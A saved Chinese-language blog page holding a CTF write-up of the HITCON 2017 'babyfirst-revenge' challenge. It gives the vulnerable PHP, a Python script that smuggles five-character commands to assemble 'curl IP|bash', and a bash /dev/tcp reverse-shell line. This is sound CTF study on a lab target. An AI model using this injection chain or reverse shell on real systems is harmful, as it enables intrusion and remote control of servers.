@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="0verWatch" />
+
+
+
+<meta name="description" content="前言开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hitcon2017 babyfirst-revenge复现">
+<meta property="og:url" content="0verwatch.top/2018/09/06/hitcon2017-babyfirst/index.html">
+<meta property="og:site_name" content="0verWatch&#39;s Blog">
+<meta property="og:description" content="前言开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/06/iCZyI1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/06/iCZgG6.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/06/iCetwd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/06/iCeaFI.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/06/iCeBSf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/06/iCeDl8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/06/iCer6S.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/06/iCeb79.md.png">
+<meta property="og:updated_time" content="2018-09-06T09:35:27.911Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hitcon2017 babyfirst-revenge复现">
+<meta name="twitter:description" content="前言开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/09/06/iCZyI1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="0verWatch&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/crystal.png">
+
+
+
+    <link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Hitcon2017 babyfirst-revenge复现 | 0verWatch&#39;s Blog</title>
+
+<script src="//cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.1/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/3.4.0/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-56ff76c972fc0cf9"></script>
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?e9bf2f4b24d981680e6d59ced18982b0";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">0verWatch</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">学习本无底，前进莫彷徨</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">归档</a></li>
+                        
+                            <li><a href="/tags/">分类&amp;标签</a></li>
+                        
+                            <li><a href="/friends/">友链</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Coding" href="https://coding.net/u/Ov3rWatch" title="Coding"></a>
+                            
+                                <a class="fa SegmentFault" href="https://segmentfault.com/" title="SegmentFault"></a>
+                            
+                                <a class="fa CSDN" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CRC32爆破/">CRC32爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux安全/">Linux安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux常用命令/">Linux常用命令</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql安全配置/">Mysql安全配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Social/">Social</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Yii/">Yii</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二分查找/">二分查找</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反序列化/">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/微机实验/">微机实验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/服务器运维/">服务器运维</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/汇编/">汇编</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流量分析/">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境部署/">环境部署</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程语言/">编程语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网站渗透/">网站渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机网路/">计算机网路</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://202.119.201.199/">CumtCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.nuptzj.cn">NuptCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.jarvisoj.com">Jarvis OJ</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.codemonster.cn/home">MOCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.bugku.com/">BugkuCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.shiyanbar.com/ctf/practice">实验吧</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://xz.aliyun.com/">先知社区</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://shentoushi.top/">渗透师导航</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://skysec.top/">一叶飘零</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.yytpublic.cn">LaurenceYu</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://chun.ringfall.me">ringfall</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">0verWatch</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">0verWatch</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">学习本无底，前进莫彷徨</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">归档</a></li>
+                
+                    <li><a href="/tags/">分类&amp;标签</a></li>
+                
+                    <li><a href="/friends/">友链</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Coding" target="_blank" href="https://coding.net/u/Ov3rWatch" title="Coding"></a>
+                            
+                                <a class="fa SegmentFault" target="_blank" href="https://segmentfault.com/" title="SegmentFault"></a>
+                            
+                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-hitcon2017-babyfirst" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/09/06/hitcon2017-babyfirst/" class="article-date">
+      <time datetime="2018-09-06T09:30:36.000Z" itemprop="datePublished">2018-09-06</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Hitcon2017 babyfirst-revenge复现
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯<a id="more"></a>emmm</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先从Hitcon2017 babyfirst-revenge这一个题目，总结一下还是学到很多东西的<br>复现地址 <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p>
+<p>这是题目回显的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>这个源码的意思就是会自动创建一个<code>/www/sandbox/</code>然后在下面新建文件夹，然后可以通过<code>cmd</code>参数去执行相关系统命令，但是这个系统命令的长度是会有限制的，这题的关键在于要绕过这个长度以及如何去构造<code>getshell</code>的命令。<br>突然发现P神就是很早就有类似文章，我还是太菜，得拼命学习啊<br><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a></p>
+<h4 id="知识点一"><a href="#知识点一" class="headerlink" title="知识点一"></a>知识点一</h4><p>在Linux下面可以通过换行去执行断断续续的命令，例如<br><img src="https://s1.ax1x.com/2018/09/06/iCZyI1.png" alt="iCZyI1.png"></p>
+<h4 id="知识点二"><a href="#知识点二" class="headerlink" title="知识点二"></a>知识点二</h4><p>在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过<code>sh filename</code>来执行文本里面的系统命令，如果有报错的话会自动跳过<br>如<br><a href="https://imgchr.com/i/iCZgG6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCZgG6.md.png" alt="iCZgG6.md.png"></a></p>
+<h4 id="知识点三"><a href="#知识点三" class="headerlink" title="知识点三"></a>知识点三</h4><p>我们可以通过&gt;+fileanme来实现新建一个文件，注意区别一下<code>&gt;</code>和<code>&gt;&gt;</code>这两个符号<br>小于号：命令默认从键盘获得的输入，改成从文件，或者其它打开文件以及设备输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; 是追加内容</span><br><span class="line">&gt; 是覆盖原有内容</span><br></pre></td></tr></table></figure>
+<p>后面会有这里的详细利用</p>
+<p>这样就可以运用这两个知识点去实现这段代码的绕过<br>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p>
+<p>这里面注意两个点<br>第一点<code>ls</code>命令列文件的顺序，通过php执行的ls命令以及直接在linux下执行的ls命令是不一样的，因为我们一开始的输入是从php里面开始的<br>ls 的默认排序方式手册上只写了是<code>alphabetically</code>（字典序），经过测试发现ls排序方式是忽视字母大小写，数字排在字母前面，无视数字和英文字母之外的字符。<br>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a><br><img src="https://s1.ax1x.com/2018/09/06/iCetwd.png" alt="iCetwd.png"></p>
+<p>所以还是按照官方wp那样通过追加方式去添加内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&gt;ls\\'</span>, </span><br><span class="line"> <span class="string">'ls&gt;_'</span>, </span><br><span class="line"> <span class="string">'&gt;\ \\'</span>, </span><br><span class="line"> <span class="string">'&gt;-t\\'</span>, </span><br><span class="line"> <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line"> <span class="string">'ls&gt;&gt;_'</span>,</span><br></pre></td></tr></table></figure>
+<p>就是为了拼凑出<code>ls -t&gt;g</code>，这是为了后面构造<code>curl 192.168.1.104|bash</code> 做好准备，我们就可以通过时间的先后顺序把curl命令完整的拼接</p>
+<p>第二点我们是通过构造文件名，然后通过<code>ls</code>命令将文件名写入到另外一个文件里面去然后执行，这里面要注意转义符号<code>\</code>(反斜杠)不要忘记</p>
+<p>然后我们在自己的vps上先写好反弹webshell的话<br><a href="https://imgchr.com/i/iCeaFI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeaFI.md.png" alt="iCeaFI.md.png"></a></p>
+<p>开始监听端口<br><img src="https://s1.ax1x.com/2018/09/06/iCeBSf.png" alt="iCeBSf.png"></p>
+<p>上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash` </span></span><br><span class="line">    <span class="string">'&gt;sh\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ba\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;6\\'</span>,  </span><br><span class="line">    <span class="string">'&gt;10\\'</span>,</span><br><span class="line">    <span class="string">'&gt;1.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;8.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;16\\'</span>, </span><br><span class="line">    <span class="string">'&gt;2.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;19\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://192.168.1.104:49200//?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">'http://192.168.1.104:49200//?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
+<p>反弹webshell成功<br>然后在<code>/home</code>目录下发现有关flag的东西，应该是在数据库里面<br>连接一下<br><img src="https://s1.ax1x.com/2018/09/06/iCeDl8.png" alt="iCeDl8.png"><br>交互性极差，每次都要exit一下才有回显，也是服气。。。但最后还是得到flag了<br><a href="https://imgchr.com/i/iCer6S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCer6S.md.png" alt="iCer6S.md.png"></a></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实这个题目还有其他骚操作，比如用利用<code>wget</code>，以及直接构造一个比较骚气的域名。。这域名搞不来，我就没有尝试了，至于wget方法的话下次复现一下2015年的babyfirst在尝试一下<br>顺便吐槽一下，最近的算法课懵逼得很，全都跟高数的级数收敛还有泰勒展开扯上关系，突然恐惧，还得重新用C++写oj上的算法题目，都是些大佬。。我做完的时候他们都不知道ak多久了。。。<br><a href="https://imgchr.com/i/iCeb79" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeb79.md.png" alt="iCeb79.md.png"></a></p>
+<p>恐怕9月份难熬23333.。。。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/09/06/hitcon2017-babyfirst/">Hitcon2017 babyfirst-revenge复现</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
+        <p><span>发布时间:</span>2018-09-06, 17:30:36</p>
+        <p><span>最后更新:</span>2018-09-06, 17:35:27</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/09/06/hitcon2017-babyfirst/" title="Hitcon2017 babyfirst-revenge复现">0verwatch.top/2018/09/06/hitcon2017-babyfirst/</a>
+            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/2018/09/06/hitcon2017-babyfirst/　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/09/06/liuliangfenxi-5-5/">
+                    铁三2018.5.5数据分析
+                </a>
+            </div>
+        
+    </nav>
+
+  
+  
+   
+    <div style="padding: 0; margin: 20px auto; width: 90%; text-align: center;">
+      <br>
+      <div>听说，打赏我的人最后都成了大佬。</div>
+      <br>
+      <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+        <div class="btn btn-pay">打赏支持</div>
+      </button>
+      <br>
+      <br>
+      <div id="QR" style="display: none;">
+        
+          <div id="wechat" style="display: inline-block;">
+            <img id="wechat_qr" src="/img/wechatpay.jpg" alt="0verWatch WeChat Pay"/>
+            <p>微信打赏</p>
+          </div>
+        
+        
+          <div id="alipay" style="display: inline-block">
+            <img id="alipay_qr" src="/img/alipay.jpg" alt="0verWatch Alipay"/>
+            <p>支付宝打赏</p>
+          </div>
+        
+        <br>
+        <br>
+      </div>
+    </div>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#知识点一"><span class="toc-number">2.0.1.</span> <span class="toc-text">知识点一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#知识点二"><span class="toc-number">2.0.2.</span> <span class="toc-text">知识点二</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#知识点三"><span class="toc-number">2.0.3.</span> <span class="toc-text">知识点三</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+        <div class="addthis_sharing_toolbox"></div>
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/09/06/liuliangfenxi-5-5/" title="下一篇: 铁三2018.5.5数据分析">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/09/06/hitcon2017-babyfirst/">Hitcon2017 babyfirst-revenge复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/06/liuliangfenxi-5-5/">铁三2018.5.5数据分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/30/anheng-8month-part1/">安恒8月应急响应题目回顾</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/29/sqli-labs-training-4/">sqli-labs实战记录(四)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/29/sqli-labs-training-3/">sqli-labs实战记录(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/29/sqli-labs-training-2/">sqli-labs实战记录(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/29/sqli-labs-training-1/">sqli-labs实战记录(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/27/bin-search-sql/">二分查找在sql盲注里面的应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/14/Solve-Me-wp/">Solve Me解题记录</a></li><li class="post-list-item"><a class="post-list-link" 